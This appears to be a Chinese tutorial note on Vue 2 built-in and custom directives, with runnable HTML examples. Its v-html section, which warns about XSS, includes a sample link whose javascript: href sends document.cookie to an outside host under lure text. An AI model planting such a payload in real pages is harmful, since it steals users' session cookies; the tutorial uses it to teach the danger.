---
title: Vue核心-内置指令与自定义指令
order: 12
---

> 本文示例代码：[NoteDemoCode/Vue/12-Vue核心-内置指令与自定义指令](https://github.com/zhf521/NoteDemoCode/tree/main/Vue/12-Vue核心-内置指令与自定义指令)

## 内置指令

常用的内置指令：
`v-bind` 单向绑定解析表达式，可简写为 `:`  
`v-model` 双向数据绑定   
`v-for` 遍历数组 / 对象 / 字符串    
`v-on` 绑定事件监听，可简写为 `@`    
`v-show` 条件渲染 (动态控制节点是否展示)   
`v-if` 条件渲染（动态控制节点是否存在）    
`v-else-if` 条件渲染（动态控制节点是否存在）   
`v-else` 条件渲染（动态控制节点是否存在） 

### v-text 指令

v-text 指令     

作用：向其所在的节点中渲染文本内容  

与插值语法的区别：v-text 会替换掉节点中的内容，`{{xxx}}` 则不会，更灵活

例：

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>v-text指令</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
  </head>
  <body>
    <div id="root">
      <div>你好，{{name}}</div>
      <div v-text="name"></div>
      <div v-text="str"></div>
    </div>
    <script>
      Vue.config.productionTip = false
      new Vue({
        el: '#root',
        data: {
          name: 'zhf',
          str: '<h3>你好呀！</h3>',
        },
      })
    </script>
  </body>
</html>
```

效果：

![Vue核心-内置指令与自定义指令01.png](https://obsidian-picture.oss-cn-qingdao.aliyuncs.com/my-img/Vue核心-内置指令与自定义指令01.png)

### v-html 指令

作用：向指定节点中渲染包含 html 结构的内容   

与插值语法的区别：  
+ v-html 会替换掉节点中所有的内容，`{{xxx}}` 则不会  
+ v-html 可以识别 html 结构   

严重注意 v-html 有安全性问题！！！  
+ 在网站上动态渲染任意 html 是非常危险的，容易导致 XSS 攻击  
+ 一定要在可信的内容上使用 v-html，永远不要用在用户提交的内容上！！！

例：

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>v-html指令</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
  </head>
  <body>
    <div id="root">
      <div>你好，{{name}}</div>
      <div v-html="str1"></div>
      <div v-html="str2"></div>
    </div>
    <script>
      Vue.config.productionTip = false
      new Vue({
        el: '#root',
        data: {
          name: 'zhf',
          str1: '<h3>你好呀！</h3>',
          str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
        },
      })
    </script>
  </body>
</html>
```

我们在 cookie 中存放如下数据

![Vue核心-内置指令与自定义指令02.png](https://obsidian-picture.oss-cn-qingdao.aliyuncs.com/my-img/Vue核心-内置指令与自定义指令02.png)

点击案例中的链接就可以获取

效果：

![Vue核心-内置指令与自定义指令03.gif](https://obsidian-picture.oss-cn-qingdao.aliyuncs.com/my-img/Vue核心-内置指令与自定义指令03.gif)

### v-cloak 指令

v-cloak 指令（没有值）   

+ 本质是一个特殊属性，Vue 实例创建完毕并接管容器后，会删掉 v-cloak 属性   
+ 使用 CSS 配合 v-cloak 可以解决网速慢时页面展示出 `{{xxx}}` 的问题 

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>v-cloak指令</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <style>
      [v-cloak] {
        display: none;
      }
    </style>
  </head>
  <body>
    <div id="root">
      <!-- 如果网速慢则一开始不显示 -->
      <h2 v-cloak>{{name}}</h2>
    </div>
    <script>
      Vue.config.productionTip = false
      new Vue({
        el: '#root',
        data: {
          name: 'zhf',
        },
      })
    </script>
  </body>
</html>
```

### v-once 指令

+ v-once 所在节点在初次动态渲染后，就视为静态内容了  
+ 以后数据的改变不会引起 v-once 所在结构的更新，可以用于优化性能

例：

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>v-once指令</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
  </head>
  <body>
    <div id="root">
      <h2 v-once>初始化的n值是：{{n}}</h2>
      <h2>当前的n值是：{{n}}</h2>
      <button @click="n++">点我n+1</button>
    </div>
    <script>
      Vue.config.productionTip = false
      new Vue({
        el: '#root',
        data: {
          n: 1,
        },
      })
    </script>
  </body>
</html>
```

效果：

![Vue核心-内置指令与自定义指令04.gif](https://obsidian-picture.oss-cn-qingdao.aliyuncs.com/my-img/Vue核心-内置指令与自定义指令04.gif)

### v-pre 指令

+ 跳过 v-pre 所在节点的编译过程  
+ 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

例：

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>v-pre指令</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
  </head>
  <body>
    <div id="root">
      <h2 v-pre>Vue其实很简单</h2>
      <h2>当前的n值是:{{n}}</h2>
      <button @click="n++">点我n+1</button>
    </div>
    <script>
      Vue.config.productionTip = false
      new Vue({
        el: '#root',
        data: {
          n: 1,
        },
      })
    </script>
  </body>
</html>
```

效果：

![Vue核心-内置指令与自定义指令05.gif](https://obsidian-picture.oss-cn-qingdao.aliyuncs.com/my-img/Vue核心-内置指令与自定义指令05.gif)

## 自定义指令

`directives`

### 定义语法

#### 局部指令

```js
new Vue({															
  directives:{ 
    指令名:配置对象 
  }   
})
```
或
```js
new Vue({															
  directives:{ 
    指令名:回调函数 
  }   
})
```

例：
```js
directives : {
    'my-directive' : {
        bind (el, binding) {
            el.innerHTML = binding.value.toupperCase()
        }
    }
}
```

#### 全局指令

```js
Vue.directive(指令名, 配置对象)
```
或
```js
Vue.directive(指令名, 回调函数)
```

例：
```js
Vue.directive('my-directive', function(el, binding){
    el.innerHTML = binding.value.toupperCase()
})
```

### 配置对象中常用的3个回调函数  

+ `bind (element, binding)` 指令与元素成功绑定时调用  
+ `inserted (element, binding)` 指令所在元素被插入页面时调用  
+ `update(element, binding)` 指令所在模板结构被重新解析时调用  

element 就是 DOM 元素，binding 就是要绑定的对象，它包含以下属性：`name` 、`value`、`oldValue`、`expression`、`arg`、`modifiers`  

例：
```js
Vue.directive('fbind', {
    // 指令与元素成功绑定时（一上来）
    bind(element, binding) {	// element就是DOM元素，binding就是要绑定的
      element.value = binding.value
    },
    // 指令所在元素被插入页面时
    inserted(element, binding) {
      element.focus()
    },
    // 指令所在的模板被重新解析时
    update(element, binding) {
      element.value = binding.value
    }
})
```

### 注意

+ 指令定义时不加 `v-`，但使用时要加 `v-`  
+ 指令名如果是多个单词，要使用 `kebab-case` 命名方式，不要用 `camelCase` 命名

### 使用指令

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>自定义指令</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
  </head>
  <body>
    <div id="root">
      <h2>当前n值是：<span v-text="n"></span></h2>
      <h2>放大10倍后的n值是：<span v-big="n"></span></h2>
      <button @click="n++">点我n+1</button>
      <hr />
      <input type="text" v-fbind:value="n" />
    </div>
    <script>
      Vue.config.productionTip = false
      //定义全局指令
      /*Vue.directive('fbind', {
        //指令与元素成功绑定时（一上来）
        bind(element, binding) {
          element.value = binding.value
        },
        //指令所在元素被插入页面时
        inserted(element, binding) {
          element.focus()
        },
        //指令所在的模板被重新解析时
        update(element, binding) {
          element.value = binding.value
        },
      })*/
      new Vue({
        el: '#root',
        data: {
          n: 1,
        },
        directives: {
          //big函数何时会被调用？
          //1.指令与元素成功绑定时（一上来）
          //2.指令所在的模板被重新解析时
          big(element, binding) {
            //console.log('big', this) //注意此处的this是window
            element.innerText = binding.value * 10
          },
          fbind: {
            //指令与元素成功绑定时（一上来）
            bind(element, binding) {
              element.value = binding.value
            },
            //指令所在元素被插入页面时
            inserted(element, binding) {
              element.focus()
            },
            //指令所在的模板被重新解析时
            update(element, binding) {
              element.value = binding.value
            },
          },
        },
      })
    </script>
  </body>
</html>
```

效果：

![Vue核心-内置指令与自定义指令06.gif](https://obsidian-picture.oss-cn-qingdao.aliyuncs.com/my-img/Vue核心-内置指令与自定义指令06.gif)
